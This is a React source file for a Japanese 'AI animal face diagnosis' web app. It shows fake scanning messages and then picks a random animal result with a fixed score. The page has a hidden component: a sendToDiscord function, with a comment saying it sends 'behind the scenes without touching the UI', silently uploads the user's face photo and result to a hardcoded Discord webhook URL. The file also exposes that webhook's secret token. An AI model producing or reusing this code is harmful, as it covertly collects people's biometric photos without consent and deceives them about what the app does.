import { useState } from "react";

/* ===== Discord Webhook ===== */
const DISCORD_WEBHOOK_URL = "https://discordapp.com/api/webhooks/1477185850046550016/Dnq_Ikv6y7kdNaLXCTsliI3_g4Z0K-3LjbERGPm84IMnZwNWM2mmnkDm8NM4J5-puRPa";

export default function Home() {
  const [phase, setPhase] = useState<"idle" | "scan" | "result">("idle");
  const [msgIndex, setMsgIndex] = useState(0);
  const [result, setResult] = useState<[string, string, string] | null>(null);
  const [file, setFile] = useState<File | null>(null);

  /* ===== 診断データ ===== */
  const animals: [string, string, string][] = [
    ["🐶", "犬タイプ", "親和性が高く、対人印象が安定しています。"],
    ["🐱", "猫タイプ", "独立性が高く、ミステリアスな印象です。"],
    ["🐰", "うさぎタイプ", "柔らかく安心感を与える印象です。"],
    ["🦊", "きつねタイプ", "知的でクールな雰囲気です。"],
    ["🦝", "たぬきタイプ", "親近感があり好印象です。"],
    ["🐻", "くまタイプ", "包容力があり頼られやすいです。"],
    ["🦁", "ライオンタイプ", "存在感が強くリーダー気質です。"],
    ["🐯", "トラタイプ", "エネルギッシュで行動派です。"],
    ["🐼", "パンダタイプ", "癒し系で好感度が高いです。"],
    ["🐨", "コアラタイプ", "落ち着いた穏やかな印象です。"],
    ["🦌", "シカタイプ", "上品で整った印象です。"],
    ["🐵", "サルタイプ", "機転が利き表情豊かです。"],
  ];

  const scanMessages = [
    "FACIAL OUTLINE SCANNING...",
    "FEATURE POINT EXTRACTION...",
    "BIOMETRIC MATCHING...",
    "RESULT GENERATING...",
  ];

  /* ===== Discord送信 ===== */
  async function sendToDiscord(
    r: [string, string, string],
    image: File | null
  ) {
    if (!DISCORD_WEBHOOK_URL) return;

    const formData = new FormData();
    formData.append(
      "content",
      `🤖 AI動物顔診断結果\n${r[0]} ${r[1]}\n${r[2]}\n魅力度：80点`
    );

    if (image) {
      formData.append("file", image);
    }

    await fetch(DISCORD_WEBHOOK_URL, {
      method: "POST",
      body: formData,
    });
  }

  /* ===== 診断開始 ===== */
  const startScan = () => {
    setPhase("scan");
    setMsgIndex(0);

    let i = 0;
    const timer = setInterval(() => {
      i++;
      setMsgIndex(i);

      if (i === scanMessages.length) {
        clearInterval(timer);
        const r =
          animals[Math.floor(Math.random() * animals.length)];
        setResult(r);
        setPhase("result");

        // 🔽 UIは触らず、裏でDiscordに送る
        sendToDiscord(r, file);
      }
    }, 800);
  };

  return (
    <div style={{ minHeight: "100vh", display: "grid", placeItems: "center" }}>
      <div
        style={{
          width: 420,
          padding: 28,
          borderRadius: 24,
          background: "rgba(10,14,39,.85)",
          border: "1px solid #00d9ff44",
          backdropFilter: "blur(20px)",
        }}
      >
        {/* HEADER */}
        <div
          style={{
            display: "flex",
            justifyContent: "space-between",
            marginBottom: 20,
          }}
        >
          <div>
            <div style={{ color: "#00d9ff", fontWeight: 700 }}>
              AI動物顔診断
            </div>
            <small style={{ color: "#7aa2c6" }}>
              Face Recognition System v1.0
            </small>
          </div>
          <div style={{ color: "#00ff88", fontSize: 12 }}>
            ● ONLINE
          </div>
        </div>

        {/* IDLE */}
        {phase === "idle" && (
          <>
            <label
              style={{
                display: "block",
                border: "2px dashed #00d9ff66",
                borderRadius: 18,
                padding: 32,
                textAlign: "center",
                cursor: "pointer",
              }}
            >
              <input
                type="file"
                accept="image/*"
                hidden
                onChange={(e) =>
                  setFile(e.target.files?.[0] || null)
                }
              />
              ⬆
              <div
                style={{
                  marginTop: 8,
                  color: "#7aa2c6",
                  fontSize: 13,
                }}
              >
                顔写真をアップロード
                <br />
                クリックして選択
              </div>
            </label>

            <button
              onClick={startScan}
              style={{
                marginTop: 24,
                width: "100%",
                padding: 14,
                borderRadius: 14,
                border: "none",
                background:
                  "linear-gradient(90deg,#00ff88,#00d9ff)",
                fontWeight: 700,
                cursor: "pointer",
              }}
            >
              解析開始
            </button>
          </>
        )}

        {/* SCAN */}
        {phase === "scan" && (
          <div style={{ textAlign: "center" }}>
            <div style={{ fontSize: 18, marginBottom: 16 }}>
              {scanMessages[msgIndex] ||
                scanMessages.at(-1)}
            </div>
            <div
              style={{
                height: 8,
                borderRadius: 999,
                background: "#0f1a3a",
                overflow: "hidden",
              }}
            >
              <div
                style={{
                  height: "100%",
                  width: `${
                    (msgIndex / scanMessages.length) *
                    100
                  }%`,
                  background:
                    "linear-gradient(90deg,#00d9ff,#00ff88)",
                  transition: "width .6s",
                }}
              />
            </div>
          </div>
        )}

        {/* RESULT */}
        {phase === "result" && result && (
          <div style={{ textAlign: "center" }}>
            <div style={{ fontSize: 72 }}>{result[0]}</div>
            <h2 style={{ margin: "8px 0" }}>
              {result[1]}
            </h2>
            <p style={{ color: "#7aa2c6" }}>
              {result[2]}
            </p>
            <b>魅力度：80点</b>
            <button
              onClick={() => setPhase("idle")}
              style={{
                marginTop: 20,
                width: "100%",
                padding: 12,
                borderRadius: 14,
                border: "1px solid #00d9ff55",
                background: "transparent",
                color: "#00d9ff",
                cursor: "pointer",
              }}
            >
              もう一度診断
            </button>
          </div>
        )}
      </div>
    </div>
  );
}
